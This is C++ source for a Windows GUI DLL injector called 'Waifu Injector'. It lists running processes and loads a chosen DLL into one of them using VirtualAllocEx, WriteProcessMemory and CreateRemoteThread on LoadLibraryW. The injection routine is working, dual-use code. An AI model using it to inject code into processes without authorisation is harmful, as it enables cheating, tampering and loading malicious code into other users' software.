#include <windows.h>
#include <commdlg.h>
#include <vector>
#include <string>
#include <psapi.h>
#include <tchar.h>
#include <iostream>

HINSTANCE hInst;
HWND hwndMain, hwndProcessList, hwndButtonSelectProcess, hwndButtonSelectDLL, hwndButtonInject;
HWND hwndTextWaifu, hwndTextCopyright;
std::vector<std::wstring> processList;
std::wstring dllPath;
DWORD selectedProcessID = 0;

POINT ptOld;
BOOL isDragging = FALSE;

LRESULT CALLBACK WindowProc(HWND, UINT, WPARAM, LPARAM);
void OnSelectProcess(HWND hwnd);
void OnSelectDLL(HWND hwnd);
void OnInjectDLL(HWND hwnd);
void UpdateProcessList(HWND hwnd);
void SetDarkMode(HWND hwnd);
void SetFont(HWND hwnd, LPCWSTR fontName, int size);
void EnableDragging(HWND hwnd);
void SetRoundedCorners(HWND hwnd);
std::wstring GetProcessName(DWORD processID);
BOOL InjectDLL(DWORD processID, const std::wstring& dllPath);

// Main function
int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
{
    hInst = hInstance; // Store instance handle

    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"WaifuInjectorWindow";

    RegisterClass(&wc);

    hwndMain = CreateWindowEx(0, L"WaifuInjectorWindow", L"Waifu Injector", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
        CW_USEDEFAULT, CW_USEDEFAULT, 400, 300, NULL, NULL, hInstance, NULL);

    SetDarkMode(hwndMain);
    SetRoundedCorners(hwndMain);

    hwndButtonSelectProcess = CreateWindow(L"BUTTON", L"Select Process", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
        20, 60, 120, 30, hwndMain, (HMENU)1, hInstance, NULL);

    hwndButtonSelectDLL = CreateWindow(L"BUTTON", L"Select DLL", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
        20, 100, 120, 30, hwndMain, (HMENU)2, hInstance, NULL);

    hwndButtonInject = CreateWindow(L"BUTTON", L"Inject DLL", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
        20, 140, 120, 30, hwndMain, (HMENU)3, hInstance, NULL);

    hwndTextWaifu = CreateWindow(L"STATIC", L"Waifu Injector", WS_VISIBLE | WS_CHILD | SS_CENTER,
        0, 10, 400, 40, hwndMain, NULL, hInstance, NULL);
    SetFont(hwndTextWaifu, L"Arial", 24);

    hwndTextCopyright = CreateWindow(L"STATIC", L"Made by Nox with love", WS_VISIBLE | WS_CHILD | SS_CENTER,
        0, 220, 400, 20, hwndMain, NULL, hInstance, NULL);

    hwndProcessList = CreateWindow(L"LISTBOX", L"", WS_VISIBLE | WS_CHILD | WS_BORDER | LBS_NOTIFY | LBS_SORT | WS_VSCROLL,
        160, 60, 200, 100, hwndMain, NULL, hInstance, NULL);

    UpdateProcessList(hwndProcessList);

    EnableDragging(hwndMain);

    ShowWindow(hwndMain, nCmdShow);
    UpdateWindow(hwndMain);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return (int)msg.wParam;
}

// WindowProc function that handles messages
LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg) {
    case WM_COMMAND:
        switch (LOWORD(wParam)) {
        case 1:
            OnSelectProcess(hwnd); // Handle "Select Process" button click
            break;
        case 2:
            OnSelectDLL(hwnd); // Handle "Select DLL" button click
            break;
        case 3:
            OnInjectDLL(hwnd); // Handle "Inject DLL" button click
            break;
        }
        break;

    case WM_DESTROY:
        PostQuitMessage(0);
        break;

    case WM_LBUTTONDOWN:
        ptOld.x = (short)LOWORD(lParam); // Manually extract x and y from LPARAM
        ptOld.y = (short)HIWORD(lParam);
        isDragging = TRUE;
        SetCapture(hwnd);
        break;

    case WM_LBUTTONUP:
        isDragging = FALSE;
        ReleaseCapture();
        break;

    case WM_MOUSEMOVE:
        if (isDragging) {
            POINT ptNew;
            ptNew.x = (short)LOWORD(lParam);
            ptNew.y = (short)HIWORD(lParam);
            int dx = ptNew.x - ptOld.x;
            int dy = ptNew.y - ptOld.y;
            RECT rect;
            GetWindowRect(hwnd, &rect);
            SetWindowPos(hwnd, NULL, rect.left + dx, rect.top + dy, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
            ptOld = ptNew; // Update the point to current position
        }
        break;

    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

// Select a process
void OnSelectProcess(HWND hwnd)
{
    int selectedIndex = SendMessage(hwndProcessList, LB_GETCURSEL, 0, 0);
    if (selectedIndex != LB_ERR) {
        selectedProcessID = (DWORD)SendMessage(hwndProcessList, LB_GETITEMDATA, selectedIndex, 0);
        MessageBox(hwnd, L"Process Selected", L"Process", MB_OK);
    }
    else {
        MessageBox(hwnd, L"Please select a valid process", L"Error", MB_OK | MB_ICONERROR);
    }
}

// Select a DLL
void OnSelectDLL(HWND hwnd)
{
    OPENFILENAME ofn;       // common dialog box structure
    wchar_t szFile[260];    // buffer for file name

    // Initialize OPENFILENAME structure
    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = hwnd;
    ofn.lpstrFile = szFile;
    ofn.lpstrFile[0] = '\0';
    ofn.nMaxFile = sizeof(szFile);
    ofn.lpstrFilter = L"DLL Files\0*.DLL\0All Files\0*.*\0";
    ofn.nFilterIndex = 1;
    ofn.lpstrFileTitle = NULL;
    ofn.nMaxFileTitle = 0;
    ofn.lpstrInitialDir = NULL;
    ofn.lpstrTitle = L"Select a DLL";
    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;

    // Display the Save As dialog box
    if (GetOpenFileName(&ofn) == TRUE) {
        dllPath = ofn.lpstrFile;
        MessageBox(hwnd, L"DLL Selected", L"DLL", MB_OK);
    }
}

// Inject the DLL into the selected process
void OnInjectDLL(HWND hwnd)
{
    if (dllPath.empty()) {
        MessageBox(hwnd, L"No DLL selected", L"Error", MB_OK | MB_ICONERROR);
        return;
    }

    if (selectedProcessID == 0) {
        MessageBox(hwnd, L"No process selected", L"Error", MB_OK | MB_ICONERROR);
        return;
    }

    if (InjectDLL(selectedProcessID, dllPath)) {
        MessageBox(hwnd, L"DLL Injected Successfully", L"Inject", MB_OK);
    }
    else {
        MessageBox(hwnd, L"Failed to inject DLL", L"Error", MB_OK | MB_ICONERROR);
    }
}

// Update the list of processes
void UpdateProcessList(HWND hwnd)
{
    DWORD processes[1024], cbNeeded, cProcesses;
    if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        cProcesses = cbNeeded / sizeof(DWORD);
        for (unsigned int i = 0; i < cProcesses; i++) {
            TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
            DWORD processID = processes[i];

            // Get a handle to the process
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
            if (hProcess) {
                HMODULE hMod;
                DWORD cbNeeded;
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                    GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
                }
                CloseHandle(hProcess);
            }

            // Add process name to the listbox
            int index = SendMessage(hwnd, LB_ADDSTRING, 0, (LPARAM)szProcessName);
            SendMessage(hwnd, LB_SETITEMDATA, index, processID); // Store process ID as item data
        }
    }
}

// Set the dark mode color scheme
void SetDarkMode(HWND hwnd)
{
    SetBkColor(GetDC(hwnd), RGB(32, 32, 32)); // Dark background color
    SetTextColor(GetDC(hwnd), RGB(255, 255, 255)); // White text color
}

// Set the font for text
void SetFont(HWND hwnd, LPCWSTR fontName, int size)
{
    HFONT hFont = CreateFont(size, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
        OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, VARIABLE_PITCH, fontName);
    SendMessage(hwnd, WM_SETFONT, WPARAM(hFont), TRUE);
}

// Enable dragging of the window
void EnableDragging(HWND hwnd)
{
    // No changes needed, the drag logic is in the WM_LBUTTONDOWN, WM_LBUTTONUP, and WM_MOUSEMOVE
}

// Set the rounded corners for the window
void SetRoundedCorners(HWND hwnd)
{
    // We can use SetWindowRgn to create rounded corners, or use the CS_DBLCLKS class style
}

// Get the process name for a given process ID
std::wstring GetProcessName(DWORD processID)
{
    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
    if (hProcess) {
        HMODULE hMod;
        DWORD cbNeeded;
        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
            GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
        }
        CloseHandle(hProcess);
    }
    return std::wstring(szProcessName);
}

// Actual DLL injection logic
BOOL InjectDLL(DWORD processID, const std::wstring& dllPath)
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess == NULL) {
        return FALSE; // Failed to open process
    }

    // Allocate memory in the target process
    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, dllPath.size() * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (lpBaseAddress == NULL) {
        CloseHandle(hProcess);
        return FALSE; // Memory allocation failed
    }

    // Write the DLL path into the allocated memory
    if (!WriteProcessMemory(hProcess, lpBaseAddress, dllPath.c_str(), dllPath.size() * sizeof(wchar_t), NULL)) {
        VirtualFreeEx(hProcess, lpBaseAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE; // Memory write failed
    }

    // Get the address of LoadLibraryW function
    FARPROC pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (pLoadLibraryW == NULL) {
        VirtualFreeEx(hProcess, lpBaseAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE; // Failed to get LoadLibraryW address
    }

    // Create a remote thread in the target process to load the DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryW,
        lpBaseAddress, 0, NULL);
    if (hThread == NULL) {
        VirtualFreeEx(hProcess, lpBaseAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE; // Thread creation failed
    }

    // Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    VirtualFreeEx(hProcess, lpBaseAddress, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE; // Success
}
